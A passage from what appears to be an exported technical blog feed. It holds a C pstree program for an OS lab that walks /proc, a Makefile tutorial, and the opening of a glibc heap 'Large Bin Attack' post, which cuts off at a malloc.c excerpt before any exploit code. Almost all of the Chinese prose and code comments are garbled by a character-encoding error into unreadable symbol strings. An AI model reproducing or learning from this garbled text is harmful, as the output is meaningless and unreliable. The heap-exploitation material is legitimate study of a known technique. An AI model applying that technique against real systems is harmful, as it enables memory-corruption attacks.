&#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰è¿›ç¨‹éƒ½æ˜¯è¿›ç¨‹1çš„å­è¿›ç¨‹ï¼Œæˆ‘ä»¬æŠŠ1è¿›ç¨‹ä½œä¸ºrootï¼Œè¾¹é€’å½’è¾¹æ‰“å°æ ‘å°±å¯ä»¥</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><blockquote><p>#include &lt;assert.h&gt;</p><p>assert(exp)å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿå®šä½é”™è¯¯ï¼Œexpä¸ºå‡ï¼ˆå³ä¸º0ï¼‰ï¼Œé‚£ä¹ˆå®ƒå…ˆå‘stderræ‰“å°ä¸€æ¡å‡ºé”™ä¿¡æ¯ï¼Œç„¶åé€šè¿‡è°ƒç”¨ abort æ¥ç»ˆæ­¢ç¨‹åºè¿è¡Œã€‚</p><p>è°ƒè¯•ç»“æŸåå¯ä»¥åœ¨#include &lt;assert.h&gt;ä¸Šæ–¹#define NDEBUGæ¥ç¦ç”¨assertè°ƒç”¨</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipinfo</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">pid_t</span> ppid;</span><br><span class="line">&#125; Pipinfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br><span class="line"></span><br><span class="line">Pipinfo allpid[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> pidcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>*, <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pid, Processtree* root, <span class="type">int</span> paddinglen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    setProcessInfo();</span><br><span class="line">    Processtree* root = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">    root-&gt;pid = allpid[<span class="number">0</span>].pid;</span><br><span class="line">    <span class="built_in">strcpy</span>(root-&gt;pidname, allpid[<span class="number">0</span>].pidname);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">option</span> <span class="title">longopt</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;show-pids&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;p&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;numeric-sort&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;n&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;version&quot;</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="string">&#x27;V&#x27;</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">switch</span> (opt = getopt_long(argc, argv, <span class="string">&quot;Vpnh&quot;</span>, longopt, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Grxer 2023 3 25\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">true</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (optind == argc) &#123;</span><br><span class="line">        creatTree(<span class="literal">false</span>, root, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pstree -h for help&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setProcessInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR* proc = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Can &#x27;t open /proc/&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pid = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>* <span class="title">entry</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">NULL</span> != (entry = readdir(proc))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == (pid = atoi(entry-&gt;d_name)))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, pid);</span></span><br><span class="line">            allpid[pidcount].pid = pid;</span><br><span class="line">            allpid[pidcount].ppid = getPpid(entry-&gt;d_name, allpid[pidcount].pidname);</span><br><span class="line">            <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, allpid[pidcount].pid, allpid[pidcount].pidname, allpid[pidcount].ppid);</span></span><br><span class="line">            pidcount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    closedir(proc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‹¿åˆ°çˆ¶è¿›ç¨‹</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getPpid</span><span class="params">(<span class="type">char</span>* pid, <span class="type">char</span>* name)</span> &#123;</span><br><span class="line">    <span class="type">char</span> processpath[<span class="number">30</span>] = <span class="string">&quot;/proc/&quot;</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, pid);</span><br><span class="line">    <span class="built_in">strcat</span>(processpath, <span class="string">&quot;/stat&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, processpath);</span></span><br><span class="line">    FILE* fp = fopen(processpath, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123;</span><br><span class="line">        <span class="type">char</span> i;</span><br><span class="line">        <span class="type">pid_t</span> _pid, ppid;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d (%s %c %d&quot;</span>, &amp;_pid, name, &amp;i, &amp;ppid);</span><br><span class="line">        name[<span class="built_in">strlen</span>(name) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// printf(&quot;%d:%s:%d\n&quot;, _pid, name, ppid);</span></span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> ppid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s %s %s&quot;</span>, <span class="string">&quot;open&quot;</span>, processpath, <span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">creatTree</span><span class="params">(<span class="type">bool</span> pidflag, Processtree* root, <span class="type">int</span> paddinglen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> childrens[<span class="number">666</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    findAllchild(root-&gt;pid, childrens);</span><br><span class="line">    <span class="type">char</span> str[<span class="number">60</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (childrens[<span class="number">0</span>] == <span class="number">0</span>) &#123;<span class="comment">//æ²¡æœ‰å­è¿›ç¨‹ç›´æ¥æ‰“å°è¿”å›</span></span><br><span class="line">        <span class="keyword">if</span> (pidflag)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s(%d)&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, root-&gt;pidname);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pidflag)</span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s(%d)-+-&quot;</span>, root-&gt;pidname, root-&gt;pid);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">sprintf</span>(str, <span class="string">&quot;%s-+-&quot;</span>, root-&gt;pidname);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">666</span> &amp;&amp; <span class="number">0</span> != childrens[i]; i++) &#123;</span><br><span class="line">        Processtree* temp = (Processtree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Processtree));</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;pid = allpid[childrens[i]].pid;</span><br><span class="line">        <span class="built_in">strcpy</span>(temp-&gt;pidname, allpid[childrens[i]].pidname);</span><br><span class="line">        creatTree(pidflag, temp, <span class="built_in">strlen</span>(str) + paddinglen);<span class="comment">//é€’å½’æ‰“å°</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; <span class="number">500</span> &amp;&amp; childrens[i + <span class="number">1</span>] != <span class="number">0</span>)<span class="comment">//ä¸‹ä¸€ä¸ªå­è¿›ç¨‹è¿˜ä¸ä¸ºç©ºï¼Œå¯¹é½ï¼Œæ‰“å°æ ‘æ</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str) + paddinglen; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;|-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰¾åˆ°å…¨éƒ¨å­çº¿ç¨‹ csapp 5.8 å¾ªç¯å±•å¼€ä¼˜åŒ–</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findAllchild</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* childrenar)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;i &lt; pidcount - <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i + <span class="number">1</span>].ppid == pid)</span><br><span class="line">            childrenar[index++] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; pidcount; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allpid[i].ppid == pid)</span><br><span class="line">            childrenar[index++] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How 2 GNU Makefile</title>
      <link href="/2023/03/25/How2Makefile/"/>
      <url>/2023/03/25/How2Makefile/</url>
      
        <content type="html"><![CDATA[<h2 id="Makefile-advantage"><a href="#Makefile-advantage" class="headerlink" title="Makefile advantage"></a>Makefile advantage</h2><ol><li>ç®¡ç†ä»£ç çš„ç¼–è¯‘ï¼Œå†³å®šè¯¥ç¼–è¯‘ä»€ä¹ˆæ–‡ä»¶ï¼Œç¼–è¯‘é¡ºåºï¼Œä»¥åŠæ˜¯å¦éœ€è¦é‡æ–°ç¼–è¯‘ï¼›</li><li>èŠ‚çœç¼–è¯‘æ—¶é—´ã€‚å¦‚æœæ–‡ä»¶æœ‰æ›´æ”¹ï¼Œåªéœ€é‡æ–°ç¼–è¯‘æ­¤æ–‡ä»¶å³å¯ï¼Œæ— éœ€é‡æ–°ç¼–è¯‘æ•´ä¸ªå·¥ç¨‹ï¼›</li><li>ä¸€åŠ³æ°¸é€¸ã€‚Makefileé€šå¸¸åªéœ€ç¼–å†™ä¸€æ¬¡ï¼ŒåæœŸå°±ä¸ç”¨è¿‡å¤šæ›´æ”¹ã€‚</li></ol><h2 id="å‘½åè§„åˆ™"><a href="#å‘½åè§„åˆ™" class="headerlink" title="å‘½åè§„åˆ™"></a>å‘½åè§„åˆ™</h2><p><strong>Makefile</strong>æˆ–<strong>makefile</strong></p><p>å…¶ä»–åå­—éœ€è¦ make -f filename</p><h2 id="åŸºæœ¬è§„åˆ™"><a href="#åŸºæœ¬è§„åˆ™" class="headerlink" title="åŸºæœ¬è§„åˆ™"></a>åŸºæœ¬è§„åˆ™</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">&lt;target&gt; : &lt;prerequisites&gt; </span><br><span class="line">[tab]  &lt;commands&gt;</span><br></pre></td></tr></table></figure><ul><li><p>åªæœ‰å½“targetä¸å­˜åœ¨ï¼Œæˆ–è¿™prerequisitesé‡Œçš„æ–‡ä»¶æ¯”targetæ–°æ˜¯æ‰ä¼šæ‰§è¡Œcommands</p></li><li><p>å¤šä¸ªç›®æ ‡æ–‡ä»¶ç”¨ç©ºæ ¼éš”å¼€ï¼Œå¯ä»¥ç”¨\æ¥æ¢è¡Œ</p></li><li><p>æ³¨é‡Š #å•è¡Œ</p></li><li><p>make æ²¡æœ‰æŒ‡å®šæ–‡ä»¶æ—¶ï¼Œé»˜è®¤ä¼šæ‰§è¡ŒMakefileæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªç›®æ ‡</p></li><li><p>.PHONY å¤šä¸ªå¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.PHONY: clean</span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> *.o temp</span><br><span class="line"><span class="comment"># make clean</span></span><br></pre></td></tr></table></figure><p>å£°æ˜cleanæ˜¯â€ä¼ªç›®æ ‡â€ä¹‹åï¼Œmakeå°±ä¸ä¼šå»æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå«åšcleançš„æ–‡ä»¶ï¼Œè€Œæ˜¯æ¯æ¬¡è¿è¡Œéƒ½æ‰§è¡Œå¯¹åº”çš„å‘½ä»¤ï¼Œè§£å†³å½“å‰æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸ªcleançš„å†²çª</p></blockquote></li><li><p>ä¼ªç›®æ ‡ï¼Œå³æ²¡æœ‰commands</p><blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span>: file1 file2 file3</span><br></pre></td></tr></table></figure><p>make sourceç›¸å½“äº</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make file1</span><br><span class="line">$ make file2</span><br><span class="line">$ make file3</span><br></pre></td></tr></table></figure></blockquote></li><li><p>@å¯ä»¥å…³é—­commandsçš„å›æ˜¾</p></li><li><p>%æ¨¡å¼åŒ¹é…ï¼ŒåŒ¹é…æ–‡ä»¶å¤¹ä¸‹æ¯ä¸€ä¸ªç¬¦åˆæ–‡ä»¶</p><blockquote><p>æ¨¡å¼è§„åˆ™æ˜¯åœ¨ç›®æ ‡åŠä¾èµ–æ¡ä»¶ä¸­ä½¿ç”¨%æ¥åŒ¹é…å¯¹åº”çš„æ–‡ä»¶ï¼Œæ¯”å¦‚åœ¨ç›®å½•ä¸‹æœ‰main.c, func1.c, func2.cä¸‰ä¸ªæ–‡ä»¶ï¼Œå¯¹è¿™ä¸‰ä¸ªæ–‡ä»¶çš„ç¼–è¯‘å¯ä»¥ç”±ä¸€æ¡è§„åˆ™å®Œæˆï¼š</p><p><code>%.o:%.c  $(CC) â€“c $&lt; -o $@</code></p></blockquote></li><li><p><strong>-</strong> ï¼šè¡¨ç¤ºæ­¤å‘½ä»¤å³ä½¿æ‰§è¡Œå‡ºé”™ï¼Œä¹Ÿä¾ç„¶ç»§ç»­æ‰§è¡Œåç»­å‘½ä»¤</p></li><li><p>include<filename> å¼•ç”¨å…¶å®ƒçš„Makefile</filename></p></li></ul><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><p>ç±»ä¼¼äºcè¯­è¨€çš„macro</p><p>ç”¨&#x3D;å·èµ‹å€¼</p><p>ç”¨$()å–å€¼</p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VARIABLE = value</span><br><span class="line"><span class="comment"># åœ¨æ‰§è¡Œæ—¶æ‰©å±•ï¼Œå…è®¸é€’å½’æ‰©å±•ã€‚</span></span><br><span class="line"></span><br><span class="line">VARIABLE := value</span><br><span class="line"><span class="comment"># åœ¨å®šä¹‰æ—¶æ‰©å±•ã€‚æ’ç­‰äº</span></span><br><span class="line"></span><br><span class="line">VARIABLE ?= value</span><br><span class="line"><span class="comment"># åªæœ‰åœ¨è¯¥å˜é‡ä¸ºç©ºæ—¶æ‰è®¾ç½®å€¼ã€‚</span></span><br><span class="line"></span><br><span class="line">VARIABLE += value</span><br><span class="line"><span class="comment"># å°†å€¼è¿½åŠ åˆ°å˜é‡çš„å°¾ç«¯ã€‚</span></span><br></pre></td></tr></table></figure><h2 id="è‡ªåŠ¨å˜é‡"><a href="#è‡ªåŠ¨å˜é‡" class="headerlink" title="è‡ªåŠ¨å˜é‡"></a>è‡ªåŠ¨å˜é‡</h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>@    è§„åˆ™ä¸­çš„ç›®æ ‡</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>&lt;     è§„åˆ™ä¸­çš„ç¬¬ä¸€ä¸ªä¾èµ–æ¡ä»¶</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span><span class="built_in">^</span>    è§„åˆ™ä¸­çš„æ‰€æœ‰ä¾èµ–æ¡ä»¶</span><br><span class="line">app: main.c func1.c fun2.c</span><br><span class="line">    gcc <span class="built_in">$</span><span class="built_in">^</span> - o <span class="built_in">$</span>@</span><br><span class="line">å…¶ä¸­ï¼š<span class="built_in">$</span><span class="built_in">^</span>è¡¨ç¤ºmain.c func1.c fun2.cï¼Œ<span class="built_in">$</span>&lt;è¡¨ç¤ºmain.cï¼Œ<span class="built_in">$</span>@è¡¨ç¤ºappã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>* ã€€ã€€ä¸åŒ…å«æ‰©å±•åçš„ç›®æ ‡æ–‡ä»¶åç§°ã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>+ ã€€ã€€æ‰€æœ‰çš„ä¾èµ–æ–‡ä»¶ï¼Œä»¥ç©ºæ ¼åˆ†å¼€ï¼Œå¹¶ä»¥å‡ºç°çš„å…ˆåä¸ºåºï¼Œå¯èƒ½åŒ…å«é‡å¤çš„ä¾èµ–æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>? ã€€ã€€æ‰€æœ‰çš„ä¾èµ–æ–‡ä»¶ï¼Œä»¥ç©ºæ ¼åˆ†å¼€ï¼Œè¿™äº›ä¾èµ–æ–‡ä»¶çš„ä¿®æ”¹æ—¥æœŸæ¯”ç›®æ ‡çš„åˆ›å»ºæ—¥æœŸæ™šã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span>@ ã€€ ç›®æ ‡çš„å®Œæ•´åç§°ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p><strong>wildcard:</strong></p><p>ç”¨äºæŸ¥æ‰¾æŒ‡å®šç›®å½•ä¸‹æŒ‡å®šç±»å‹çš„æ–‡ä»¶ï¼Œå‚æ•°å°±æ˜¯ç›®å½•+æ–‡ä»¶ç±»å‹ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">src = $ï¼ˆwildcard ./src/*.c)</span><br></pre></td></tr></table></figure><p>è¿™å¥è¯è¡¨ç¤ºï¼šæ‰¾åˆ°.&#x2F;src ç›®å½•ä¸‹æ‰€æœ‰åç¼€ä¸º.cçš„æ–‡ä»¶ï¼Œå¹¶èµ‹ç»™å˜é‡srcã€‚</p><p><strong>patsubst:</strong></p><p>åŒ¹é…æ›¿æ¢ï¼Œä¾‹å¦‚ä»¥ä¸‹ä¾‹å­ï¼Œç”¨äºä»srcç›®å½•ä¸­æ‰¾åˆ°æ‰€æœ‰.c ç»“å°¾çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶æ›¿æ¢ä¸º.oæ–‡ä»¶ï¼Œå¹¶èµ‹å€¼ç»™objã€‚</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">obj = $(patsubst %.c ,%.o ,$(src))</span><br></pre></td></tr></table></figure><p>æŠŠsrcå˜é‡ä¸­æ‰€æœ‰åç¼€ä¸º.cçš„æ–‡ä»¶æ›¿æ¢æˆ.oã€‚</p><p>ç‰¹åˆ«åœ°ï¼Œå¦‚æœè¦æŠŠæ‰€æœ‰.oæ–‡ä»¶æ”¾åœ¨objç›®å½•ä¸‹ï¼Œå¯ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ob = $(patsubst ./src/%.c, ./obj/%.o, $(src))</span><br></pre></td></tr></table></figure><p><strong>subst</strong></p><p>subst å‡½æ•°ç”¨æ¥æ–‡æœ¬æ›¿æ¢ï¼Œæ ¼å¼å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(subst from,to,text)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$(subst ee,EE,feet on the street)</span><br><span class="line">å°†å­—ç¬¦ä¸²&quot;feet on the street&quot;æ›¿æ¢æˆ&quot;fEEt on the strEEt&quot;ã€‚</span><br></pre></td></tr></table></figure><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello/</span><br><span class="line">â”œâ”€â”€main.c</span><br><span class="line">â”œâ”€â”€factorial.c</span><br><span class="line">â”œâ”€â”€printhello.c</span><br><span class="line">â””â”€â”€functions.h</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">TARGET = hello</span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">wildcard</span> ./*.c)</span></span><br><span class="line">OBJ=<span class="variable">$(<span class="built_in">patsubst</span> ./%.c,./%.o,<span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">GCCFLAGS= -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJ)</span></span><br><span class="line">    <span class="variable">$(CC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line">clean :</span><br><span class="line">    rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2023/03/24/Large-bin-attack/"/>
      <url>/2023/03/24/Large-bin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p><img src="/2023/03/24/Large-bin-attack/image-20230812163127239.png" alt="image-20230812163127239"></p><p>åœ¨ç¨‹åºmallocæ—¶ï¼Œå¦‚æœfast binã€small binä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„chunkï¼Œå°±ä¼šå°è¯•ä»Unsorted binä¸­å¯»æ‰¾chunkã€‚å¦‚æœå–å‡ºæ¥çš„chunkçš„sizeåˆšå¥½æ»¡è¶³ï¼Œåˆ™ç›´æ¥äº¤ç»™ç”¨æˆ·ï¼Œå¦åˆ™å°±ä¼šæŠŠè¿™äº›chunkåˆ†åˆ«æ’å…¥åˆ°å¯¹åº”çš„binä¸­ï¼Œ32ä½ç¨‹åºå¤§äº504(0x1f8)è¿›å…¥largebinï¼Œ64ä½ç¨‹åºå¤§äº1008(0x3f0)è¿›å…¥largebinï¼Œå¦åˆ™åˆé€‚çš„è¯è¿›å…¥smallbin</p><p>largebinæ¯”unsortedbinå¤šäº†<code> struct malloc_chunk* fd_nextsize;</code>æŒ‡å‘æ¯”å½“å‰å°çš„chunk<code> struct malloc_chunk* bk_nextsize;</code>æŒ‡å‘æ¯”å½“å‰å¤§çš„chunk</p><h2 id="Large-Binçš„æ’å…¥é¡ºåº"><a href="#Large-Binçš„æ’å…¥é¡ºåº" class="headerlink" title="Large Binçš„æ’å…¥é¡ºåº"></a>Large Binçš„æ’å…¥é¡ºåº</h2><ol><li>æŒ‰ç…§å¤§å°ï¼Œä»å¤§åˆ°å°æ’åº,largebiné“¾æ¥æœ€å°çš„chunk</li><li>å¦‚æœå¤§å°ç›¸åŒï¼ŒæŒ‰ç…§freeçš„æ—¶é—´æ’åº</li><li>å¤šä¸ªå¤§å°ç›¸åŒçš„å †å—ï¼Œåªæœ‰é¦–å †å—çš„fd_nextsizeå’Œbk_nextsizeä¼šæŒ‡å‘å…¶ä»–å †å—ï¼Œåé¢çš„å †å—çš„fd_nextsizeå’Œbk_nextsizeå‡ä¸º0</li><li>sizeæœ€å¤§çš„chunkçš„bk_nextsizeæŒ‡å‘æœ€å°çš„chunkï¼Œsizeæœ€å°çš„chunkçš„fd_nextsizeæŒ‡å‘æœ€å¤§çš„chunk</li></ol><h2 id="2-23malloc-cæºç -remove-from-unsorted-list"><a href="#2-23malloc-cæºç -remove-from-unsorted-list" class="headerlink" title="2.23malloc.cæºç  remove from unsorted list"></a>2.23malloc.cæºç  remove from unsorted list</h2><p>victimæ˜¯æˆ‘ä»¬è¦ä»unsortedbinåˆ†ç±»çš„chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = 